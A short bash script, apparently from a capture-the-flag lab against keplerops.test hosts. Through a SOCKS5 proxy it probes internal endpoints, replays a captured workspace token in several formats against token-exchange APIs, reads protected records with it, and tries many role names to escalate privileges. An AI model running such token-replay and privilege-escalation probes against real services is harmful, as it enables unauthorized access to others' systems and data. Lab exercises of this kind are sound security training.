set +e
P="--socks5-hostname 127.0.0.1:1080 -sk -m 15"
echo "===== WELL-KNOWN data ====="
curl $P https://data.keplerops.test/.well-known/fieldkest-client; echo
echo "===== WELL-KNOWN workloads ====="
curl $P https://workloads.keplerops.test/.well-known/fieldkest-client; echo
echo "===== WELL-KNOWN identity ====="
curl $P https://identity.keplerops.test/.well-known/fieldkest-client; echo
echo "===== WELL-KNOWN support/objects ====="
for h in objects.keplerops.test support.keplerops.test source.keplerops.test; do echo "--- $h"; curl $P "https://$h/.well-known/fieldkest-client"; echo; done
B=https://cloud-api.keplerops.test
WT='FLAG{6bb66074f2325405}'
p(){ echo "=== $1"; shift; curl $P -w '\n[HTTP %{http_code}]\n' "$@" 2>&1 | head -40; }
echo "######## EXCHANGE"
p "GET bearer" -H "Authorization: Bearer $WT" "$B/api/workspaces/current/token-exchange"
p "GET x-workspace-token" -H "X-Workspace-Token: $WT" "$B/api/workspaces/current/token-exchange"
p "POST json workspace_token" -X POST -H 'Content-Type: application/json' -d "{\"workspace_token\":\"$WT\"}" "$B/api/workspaces/current/token-exchange"
p "POST json token" -X POST -H 'Content-Type: application/json' -d "{\"token\":\"$WT\"}" "$B/api/workspaces/current/token-exchange"
p "POST form workspace_token" -X POST -d "workspace_token=$WT" "$B/api/workspaces/current/token-exchange"
echo "######## RESOURCES with WT bearer"
for u in /api/exports/EXP-2841 /api/exports/EXP-2841/definition /api/schedules/SCHED-2841 /api/build-records/BLD-REL-742 /api/trust-records/TR-2841 /api/maintenance; do
 p "GET $u" -H "Authorization: Bearer $WT" "$B$u"
done
echo "######## ROLE EXCHANGE with WT"
for r in workload workload-identity fieldlink workload-reader reader workspace rowan-workspace; do
 p "POST role $r" -X POST -H 'Content-Type: application/json' -d "{\"workspace_token\":\"$WT\"}" "$B/api/token-exchange/$r"
done
